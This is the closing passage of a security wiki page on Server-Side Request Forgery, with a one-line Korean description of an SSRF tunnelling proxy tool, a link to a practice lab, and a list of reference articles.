SSRF Proxy는 Server-Side Request Forgery(SSRF)에 취약한 HTTP 서버를 통해 클라이언트의 HTTP 트래픽을 터널링하도록 설계된 다중 스레드 HTTP 프록시 서버입니다.

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
